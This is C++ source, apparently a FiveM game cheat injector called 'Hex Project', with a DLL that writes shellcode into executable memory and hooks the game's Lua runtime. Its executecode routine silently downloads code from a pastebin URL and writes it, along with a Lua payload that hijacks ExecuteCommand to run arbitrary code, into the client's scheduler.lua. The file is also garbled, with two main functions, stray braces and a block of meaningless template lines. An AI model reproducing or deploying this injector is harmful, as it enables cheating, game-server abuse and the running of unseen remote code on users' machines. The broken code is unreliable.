#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <string>
#include <iostream>
#include "auth.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <random>
#include <csignal>
#include <fstream>
#include <iostream>
#include <sstream> //std::stringstream
#include <iostream>
#include <random>
#include <string>
#include <fstream>
#include <sstream>
#include <strsafe.h>
#include "Console.h"
#pragma comment(lib, "urlmon.lib")
#define UNLEN 64
#define UNLEN 64
string sp = a_gethid();


using namespace std;
namespace con = JadedHoboConsole;

bool GetProcessEntryByName(string name, PROCESSENTRY32* pe) {
	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		cerr << "Tool helper cannot be created" << endl;
		return false;
	}

	if (!Process32First(snapshot, pe)) {
		cerr << "Tool helper cannot retrieve the first entry of process list" << endl;
		return false;
	}

	do {
		if (pe->szExeFile == name) {
			snapshot ? CloseHandle(snapshot) : 0;
			return true;
		}
	} while (Process32Next(snapshot, pe));

	snapshot ? CloseHandle(snapshot) : 0;
	return false;
}

int LoadSystemFile(uint64_t luaRuntime, const char* scriptFile) {
    *(BYTE*)(CustomAPI::GetModuleA("adhesive") + 0x471448) = 1;
    auto result = ((RunFileInternal_t)(csLuaBase + 0x27A80))(luaRuntime, scriptFile, std::bind(&LoadSystemFileInternal, luaRuntime, std::placeholders::_1));
    return result;
}


BOOL APIENTRY DllMain( HMODULE hModule, DWORD  callReason, LPVOID lpReserved ){
    if (callReason == DLL_PROCESS_ATTACH) {
        std::thread([&] {
            while (!csLuaBase)
                csLuaBase = CustomAPI::GetModuleA("citizen-scripting-lua");
            
            for (;;) {
                uint64_t* c1 = (uint64_t*)(csLuaBase + 0x60CE70);
                if (*c1 != 0)
                    grabbedInstance = *c1;

                std::this_thread::sleep_for(std::chrono::milliseconds(250));
            }
        }).detach();

        std::thread([&] {

            for (;;) {
                if (!grabbedInstance)
                    std::this_thread::sleep_for(std::chrono::seconds(5));

                if (GetAsyncKeyState(VK_F5)) {
                    LoadSystemFile(grabbedInstance, "C:/memes/test.lua");
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                }

                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }

        }).detach();
    }

    return TRUE;
}



char LSFIShell[] = { 0x55, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x38, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69 };

uint64_t csLuaBase;
uint64_t grabbedInstance;
uint64_t allocLSFI;


int _fastcall LoadSystemFileInternal(uint64_t luaRuntime, const char* scriptFile) {
    if (!allocLSFI) {
        allocLSFI = reinterpret_cast<uint64_t>(VirtualAlloc(NULL, sizeof(LSFIShell), MEM_COMMIT, 0x40));
        memcpy((void*)allocLSFI, (void*)LSFIShell, sizeof(LSFIShell));
        *(uint64_t*)(allocLSFI + 14) = csLuaBase + 0x27998;
    }

    return ((LoadSystemFileInternal_t)(allocLSFI))(luaRuntime, scriptFile);
}

void clear() {
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(
		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	FillConsoleOutputAttribute(
		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	SetConsoleCursorPosition(console, topLeft);
}


string openfilename(HWND owner = NULL) {
	OPENFILENAME ofn;
	char fileName[MAX_PATH] = "";
	ZeroMemory(&ofn, sizeof(ofn));
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.hwndOwner = owner;
	ofn.lpstrFilter = "Mod Menu Lua (*.lua)\0*.lua\0All Files (*.*)\0*.*\0";
	ofn.lpstrFile = fileName;
	ofn.nMaxFile = MAX_PATH;
	ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
	ofn.lpstrDefExt = "";
	string fileNameStr;
	if (GetOpenFileName(&ofn))
		fileNameStr = fileName;
	return fileNameStr;
}


void executecode()
{ 
	//GET CODE FROM WEB // INVISIBLE
	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nTriggerServerEvent('FAC:Hex Project')\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";

	//GET PATH AND CREATE FILE
	std::string path = getenv("LOCALAPPDATA");
	ofstream myfile;
	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
	myfile << shedulercode + "\n";
	myfile << triggerexploit + "\n";
	myfile.close();
}


/*void fixcrash()
{
	std::string path = getenv("LOCALAPPDATA");
	string deletes = "del " + path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua";
	system(deletes.c_str());
	string location = path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua";
	string url = "https://sencured/";
	HRESULT hr = URLDownloadToFile(NULL, (url).c_str(), (location).c_str(), 0, NULL);
}*/

}

string a_DownloadURL(string URL) {
	HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HINTERNET urlFile;
	string rtn;
	if (interwebs) {
		urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
		if (urlFile) {
			char buffer[2000];
			DWORD bytesRead;
			do {
				InternetReadFile(urlFile, buffer, 2000, &bytesRead);
				rtn.append(buffer, bytesRead);
				memset(buffer, 0, 2000);
			} while (bytesRead);
			InternetCloseHandle(interwebs);
			InternetCloseHandle(urlFile);
			string p = a_replaceAll(rtn, "|n", "\r\n");
			return p;
		}
	}
	InternetCloseHandle(interwebs);
	string p = a_replaceAll(rtn, "|n", "\r\n");
	return p;
}
StringCbCatA
{
	size_t size = strlen(str1) + strlen(str2) + 1;
	char *buffer = (char*)malloc(size);
	StringCbCopyA(buffer, size, str1);
	StringCbCatA(buffer, size, str2);
	return buffer;
	_CXX17_DEPRECATE_ADAPTOR_TYPEDEFS(StringCbCatA, StringCbCatA_adaptor)
	false, false
	transaction_safe_dynamic_adaptor<char>
	transaction_safe_dynamic_adaptor<wchar_t>
	transaction_safe_dynamic_adaptor<char16_t>
	transaction_safe_dynamic_adaptor<char32_t>
	transaction_safe_dynamic_adaptor<signed char>
	transaction_safe_dynamic_adaptor<unsigned char>
	transaction_safe_dynamic_adaptor<short>
	transaction_safe_dynamic_adaptor<unsigned short>
	transaction_safe_dynamic_adaptor<int>
	transaction_safe_dynamic_adaptor<unsigned int>
	transaction_safe_dynamic_adaptor<long>
	transaction_safe_dynamic_adaptor<unsigned long>
	transaction_safe_dynamic_adaptor<long long>
	transaction_safe_dynamic_adaptor<unsigned long long>
	transaction_safe_dynamic_adaptor<float>
	transaction_safe_dynamic_adaptor<double>
	transaction_safe_dynamic_adaptor<long double>
	transaction_safe_dynamic_adaptor<void*>
	transaction_safe_dynamic_adaptor<void const*>
	transaction_safe_dynamic_adaptor<void volatile*>
	transaction_safe_dynamic_adaptor<void const volatile*>
}

int main()
{
	executecode();
	//fixcrash();	//FIX CRASH
	return 0;
	
}
int main(int argc, const char* argv[]) {
	system("START https://discord.gg/3yXwTzghHR");
	SetConsoleTitleA("Hex Project | By Sarnax#8465 | Discord : https://discord.gg/3yXwTzghHR");
	clear();
	string  path;
	path = getenv("localappdata");
	ifstream ifile(path + "\\FiveM\\FiveM.app\\adhesive.dll");
	if (ifile) {
	}
	else {
		std::cout << con::fg_white << "[" << con::fg_red << "-" << con::fg_white << "] Your fivem not install in AppData\\Local\\FiveM\\FiveM.app\\ ! Reinstall fivem and try again !" << con::fg_white << " !";
		Sleep(999999999999999);
	}
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (GetProcessEntryByName("FiveM_GTAProcess.exe", &pe)) {
		std::cout << con::fg_white << "[" << con::fg_red << "-" << con::fg_white << "] You need open exec before " << con::fg_yellow << "FiveM" << con::fg_white << " !";
		Sleep(999999999999999999);
	}
	cout << "[" << con::fg_red << "+" << con::fg_white <<  "] Waiting for " << con::fg_green << "FiveM_GTAProcess.exe" << con::fg_white << " ..." << endl;
	for (; !GetProcessEntryByName("FiveM_GTAProcess.exe", &pe); Sleep(100));
	//fixcrash();
	cout << "[" << con::fg_red << "+" << con::fg_white << "] Injected !" << endl;
	Sleep(3000);
	clear();
	cout << "[" << con::fg_green << "/" << con::fg_white << "] Thank you for choosing " << con::fg_blue << "EzShop " << con::fg_white << "!" << endl;
	Sleep(500);
	cout << "[" << con::fg_green << "/" << con::fg_white << "] server is " << con::fg_green << "online" << con::fg_white << " ..." << endl;
	cout << "[" << con::fg_green << "/" << con::fg_white << "] You have " << con::fg_green << "last update " << con::fg_white << "..." << endl;
	cout << "[" << con::fg_green << "/" << con::fg_white << "] The exec is " << con::fg_green << "not disabled " << con::fg_white << "..." << endl;
	std::cout << "\n";
	cout << "[" << con::fg_green << "1" << con::fg_white << "]" << con::fg_magenta << " EzMenu" << con::fg_white << endl;
	cout << "[" << con::fg_green << "2" << con::fg_white << "]" << con::fg_blue << " Trigger & Execute Menu In Game" << con::fg_white << endl;
	cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Menu : " << con::fg_white;
	string number;
	cin >> number;
	if (number == "1") {
		executecode();
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected ! Key is DELETE" << endl;
		Sleep(99999999999999);
	}
	else {
		cout << "[" << con::fg_red << "!" << con::fg_white << "] Wrong choice !" << con::fg_white << endl;
		Sleep(999999999999999);
	}
}

.
	
